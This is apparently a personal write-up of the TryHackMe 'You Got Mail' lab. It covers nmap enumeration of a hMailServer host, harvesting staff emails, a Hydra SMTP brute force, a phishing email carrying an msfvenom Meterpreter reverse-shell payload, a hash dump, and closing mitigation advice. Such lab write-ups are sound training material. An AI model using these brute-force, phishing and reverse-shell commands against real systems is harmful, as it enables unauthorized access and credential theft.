# You Got Mail (THM)

# **Overview**
- The 'You Got Mail' lab focused on penetration testing a vulnerable mail server, replicating real-world attack scenarios to uncover security flaws. Through network enumeration, credential brute-forcing, phishing exploitation, and post-exploitation techniques, I successfully gained unauthorized access, demonstrating key offensive security skills. Leveraging tools like Nmap, Hydra, Metasploit, and Hashcat, I explored SMTP authentication vulnerabilities, bypassed login security, and escalated privileges to control the target system. This lab reinforced the importance of email security, access control, and proactive defense measures against real-world cyber threats.

# Scope Details

- Strictly passive reconnaissance allowed on [brownbrick.co](https://brownbrick.co/).
- Permitted to perform active assessments on 10.10.224.121

## Enumeration

### 10.10.224.121

```jsx
PORT      STATE SERVICE       REASON          VERSION
25/tcp    open  smtp          syn-ack ttl 125 hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          syn-ack ttl 125 hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack ttl 125 hMailServer imapd
|_imap-capabilities: OK CHILDREN SORT completed CAPABILITY IMAP4 NAMESPACE IMAP4rev1 ACL IDLE RIGHTS=texkA0001 QUOTA
445/tcp   open  microsoft-ds? syn-ack ttl 125
587/tcp   open  smtp          syn-ack ttl 125 hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=BRICK-MAIL
| Issuer: commonName=BRICK-MAIL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-05-03T02:28:01
| Not valid after:  2025-11-02T02:28:01
| MD5:   24a9:43e0:3046:9e1d:d525:9a69:c5ad:0850
| SHA-1: 48c8:1f3d:9a74:3a8c:799c:1af0:f9a6:0eea:88f3:4229
| -----BEGIN CERTIFICATE-----
| MIIC2DCCAcCgAwIBAgIQWpF8iX9zCp9B93TSJZP0xzANBgkqhkiG9w0BAQsFADAV
| MRMwEQYDVQQDEwpCUklDSy1NQUlMMB4XDTI1MDUwMzAyMjgwMVoXDTI1MTEwMjAy
| MjgwMVowFTETMBEGA1UEAxMKQlJJQ0stTUFJTDCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBANVBwcSgHAmNWstSab3fzC0wbUCRuKP0oeXsuBcT9mBKwn/N
| gkWNzjB+NQuAFqoxTjijGweawnvNhQW02o8Lmmac0/CtunrCsBcD9V7dHD9RVMHg
| 6ORO8ebCUcEuD/IeTLbJjbq19sdzRlC+jVOAtaU2PzYTt/OM88zMFHkRFWNxy7qv
| oYKbFuARWeDYc6pha92wr6/DzpCh2/PxJ4HdJbU1lKnfZFkDkTIVmLip+m/eDuAa
| /t6GpyEpHaah40fRiG9zzaaJndQyXG24ka0NzSlpuGnjytzBxaVU485YF6AQXkKf
| nDymAkDvchYRPkbiG+BhEJPkWjohfz+3EqQHU3ECAwEAAaMkMCIwEwYDVR0lBAww
| CgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQBdBNqR
| GIuqz9Xoa76Tr4o0b9gOAP+agiNjOZ+ZTGrINUse4gpHbkNvxM3m3/pL04IfRqLu
| sIFdVc75+wtuZL+UO+/TPl5PCmuBy4RasZ3zrg/GrwfBKgp87f+EedFdE1cKKEVV
| z/b9BAS3BorUIMNTszPtci6yX+WjseS0wvMT1buluVJLNClhwn4sQl8VpHXh1bts
| VaLlVyAI+ZUfaqp4GafXBCk4gs5qEpQgdWM5FJWX5NSnQJV9DsLgXEF3Xx9BTXT8
| P8u3KBNxFhbvvuS6mszMlicTKs/cfcMWiYVuyEL9PMnZ4lb4VMEigwLLQp6GgexK
| /3I4nxGUOYo3B8xg
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: BRICK-MAIL
|   NetBIOS_Domain_Name: BRICK-MAIL
|   NetBIOS_Computer_Name: BRICK-MAIL
|   DNS_Domain_Name: BRICK-MAIL
|   DNS_Computer_Name: BRICK-MAIL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-04T02:39:38+00:00
|_ssl-date: 2025-05-04T02:39:45+00:00; -5s from scanner time.
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 1903 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=5/3%OT=25%CT=%CU=33817%PV=Y%DS=4%DC=T%G=N%TM=6816D37D%P=x86_64-pc-linux-gnu)

```

### Enumeration passively through - brownbrick.co

There was nothing of interest on the website other than this ‘team’ list.

![images/image.png](images/image.png)

Username Enumeration. 

Omar Aurelius

[oaurelius@brownbrick.co](mailto:oaurelius@brownbrick.co)
Winifred Rohit

[wrohit@brownbrick.co](mailto:wrohit@brownbrick.co)
Laird Hedvig

[lhedvig@brownbrick.co](mailto:lhedvig@brownbrick.co)
Titus Chikondi

[tchikondi@brownbrick.co](mailto:tchikondi@brownbrick.co)
Pontos Cathrine

[pcathrine@brownbrick.co](mailto:pcathrine@brownbrick.co)
Filimena Stamatis

[fstamatis@brownbrick.co](mailto:fstamatis@brownbrick.co)

```jsx
//below is a custom word list created to try with hydra 

oaurelius@brownbrick.co
lhedvig@brownbrick.co
tchikondi@brownbrick.co
pcathrine@brownbrick.co
fstamatis@brownbrick.co
```

### SMTP(Port 25)

```jsx
25/tcp    open  smtp          syn-ack ttl 125 hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

```

- Enumerating SMTP, I used the cewl command to create a custom word-list against the emails found in their contact page. I was unsuccessful until I used the - -**lowercase** flag in cewl which provided me a way as seen below.

```bash

#to create the custom list of words from `cewl`
cewl https://brownbrick.co --lowercase > custom_pass.txt

#using the custom word list with Hydra with out userlist from website reconnaissance 
┌──(kali㉿vbox)-[~/Documents/Rooms/yougotmail]
└─$ hydra -L users.txt -P custom_pass.txt mail.thm smtp -V 

```

User Creds brute forced. 

![images/image.png](images/image%201.png)

### Post-Credentials - Trying to get into system using the Creds found

```bash
[25][smtp] host: mail.thm   login: lhedvig@brownbrick.co   password: bricks

#since RDP port 3389 is open we will try these creds.
#used remmina but was unable to login. :/
#tried the following stuff but failed. 
──(kali㉿vbox)-[~]
└─$ nxc smb mail.thm -u lhedvig -p bricks --shares
SMB         10.10.224.121   445    BRICK-MAIL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:BRICK-MAIL) (domain:BRICK-MAIL) (signing:False) (SMBv1:False)
SMB         10.10.224.121   445    BRICK-MAIL       [-] BRICK-MAIL\lhedvig:bricks STATUS_LOGON_FAILURE
                                                                                
┌──(kali㉿vbox)-[~]
└─$ nxc smb mail.thm -u brownbrick.co\lhedvig -p bricks --shares
SMB         10.10.224.121   445    BRICK-MAIL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:BRICK-MAIL) (domain:BRICK-MAIL) (signing:False) (SMBv1:False)
SMB         10.10.224.121   445    BRICK-MAIL       [-] BRICK-MAIL\brownbrick.colhedvig:bricks STATUS_LOGON_FAILURE
                                                                                                             
┌──(kali㉿vbox)-[~]
└─$ nxc smb mail.thm -u brownbrick.co\lhedvig -p bricks --local-auth          
SMB         10.10.224.121   445    BRICK-MAIL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:BRICK-MAIL) (domain:BRICK-MAIL) (signing:False) (SMBv1:False)
SMB         10.10.224.121   445    BRICK-MAIL       [-] BRICK-MAIL\brownbrick.colhedvig:bricks STATUS_LOGON_FAILURE
                                                                                                             
┌──(kali㉿vbox)-[~]
└─$ smbclient -L \\mail.thm -U lhedvig
Password for [WORKGROUP\lhedvig]:
session setup failed: NT_STATUS_LOGON_FAILURE

```

since none of the above worked tried logging into the email to find information there using evolution, since the mutt client was giving me an issue. - However there were no emails to be found. 

![images/image.png](images/image%202.png)

- since this is a room called ‘you got mail’ I’m thinking there may a automated system that views and clicks on emails including their attachments. Thus trying phishing emails now to get a possible reverse shell.

### Sending the phishing email

- I had to specify authentication for SMTP - logged in with the creds above
- Updated the SMTP Port

![images/image.png](images/image%203.png)

```bash
#creating the payload and stating the listner 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.84.253 LPORT=1337 -f exe > fakeupdate.exe

#listening on the specified port. 
nc -nvlp 1337 

#^realised the above will not work, and I need to use msf6 to actually get a reverse shell

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.13.84.253:1337 
[*] Sending stage (177734 bytes) to 10.10.224.121
[*] Meterpreter session 1 opened (10.13.84.253:1337 -> 10.10.224.121:49807) at 2025-05-04 14:06:32 -0400

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > getuid
Server username: BRICK-MAIL\wrohit

```

### Post Shell - Exploitation

- I was able to go through the files and find how the flag! (YAY, finally!)

![images/image.png](images/image%204.png)

- now that we have this, we can verify if we have admin privileges. I can see we do thus we do a hash dump and just use HashCat or John the Ripper to crack the hash.

![images/image.png](images/image%205.png)

- for the last flag we need to find out the password to access the hMailServer Administrator Dashboard. We found online that the password is stored “C:\Program Files (x86)\hMailServer\Bin\”. We traverse the directory and find the file where its located.

![images/image.png](images/image%206.png)

# Learning outcomes

Through this lab, I strengthened my cybersecurity and ethical hacking skills by gaining hands-on experience in:

1.Network and Service Enumeration: Using Nmap to identify open ports and understand SMTP, IMAP, and RPC services.

2.Credential Harvesting and Brute-Forcing: Creating custom wordlists with cewl and using Hydra to crack login credentials.

3.Phishing and Payload Delivery: Creating a malicious email to exploit a mail server vulnerability and deploying msfvenom payloads.

4.Reverse Shell Execution and Post-Exploitation: Gaining system control through Metasploit, performing hash dumps, and escalating privileges.

5.Security Mindset: Learning mail server(hMailServer) vulnerabilities and the critical importance of email security, strong authentication, and system protection.

# Extra Learnings

I started thinking about a fundamental flaw in hMailServer. If I had to run this service in a production environment, what could I do to protect it from being exploited in this way?

hMailServer stores its administrator password as an unsalted MD5 hash in hMailServer.ini, which is a significant security weakness. To mitigate this, administrators should enforce strong, unique passwords, restrict access to the configuration file to administrators only, use disk or file encryption, and monitor for unauthorized changes.

However, given hMailServer’s lack of modern security features and active maintenance, the most effective solution is to migrate to a more secure and actively supported alternative option.
